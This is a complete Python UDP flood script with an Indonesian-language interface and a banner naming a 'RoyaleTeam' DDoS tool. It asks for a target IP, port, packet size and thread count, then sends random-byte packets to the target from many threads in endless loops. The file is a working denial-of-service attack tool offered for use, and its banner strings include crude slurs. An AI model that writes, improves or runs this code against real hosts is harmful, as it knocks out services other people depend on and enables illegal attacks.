try:
    import threading
    import socket
    import random
    import sys
    
except ImportError as e:
    print(f"\033[1;31m[KESALAHAN] \033[0m\xBB {e}")
    sys.exit()

def random_phrase():
    ppl = ["XXJAX", "ZAIDANSU", "AHAHA", "CYBEE-KONTOL", "PowerDDoSJAX", "King•BONAR", "DONKEY", "REHAN", "DONKET", "XXJAX"]
    phrase = ["Tools", "Ddos Attack", "Buatan", "ROYALETEAM", "Jangan Di Gunakan", "Untuk Menyerang Situs", "NASA", "POLRI.GO.ID", "BIGETRON", "Dan Lain Lain"]
    return random.choice(ppl) + " " + random.choice(phrase)

def banner():
    print(f"""\033[2;31m
     
{random_phrase()}
    \033[2;33mVersion: V2.3 \t Author Code: RoyaleCommunity\n\033[0m
    """)

def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(f"\033[1;34m[THREAD {index}] \033[0m\xBB \033[1;35m{size}\033[0m bytes sent to \033[1;35m{ip}\033[0m")

def main():
    try:
        if sys.version_info[0] != 3:
            print("\033[1;31m[KESALAHAN] \033[0m\xBB Untuk Menjalankan Tools Gunakan Python3 Bro")
            sys.exit()
        
        if len(sys.argv) < 5:
            banner()

        IP       = input("\033[1;34m[>] \033[2;32m[Masukan Target IP] \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("\033[1;34m[>] \033[2;32m[Masukan Target Port] \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE     = int(input("\033[1;34m[>] \033[2;32m[Masukan Jumlah Size Packet] \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT    = int(input("\033[1;34m[>] \033[2;32m[Masukan Jumlah Threads]\xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 65535 or PORT < 1:
            print("\n\033[1;31m[KESALAHAN] \033[0m\xBB Tolong,Masukan Angka Port Dari 1 Hingga 65535")
            sys.exit(1)

        if SIZE > 65500 or SIZE < 1:
            print("\n\033[1;31m[KESALAHAN] \033[0m\xBB Tolong,Masukan Jumlah Size Packet Dari 1 Hingga 65535")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\n\033[1;31m[!] \033[0mExiting...")
        sys.exit()
    
    except Exception as e:
        print(f"\n\033[1;31m[KESALAHAN] \033[0m\xBB {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[KESALAHAN] \033[0m\xBB Terjadi kesalahan saat menginisialisasi Packet {i}: {e}")            

if __name__ == "__main__":
    main()
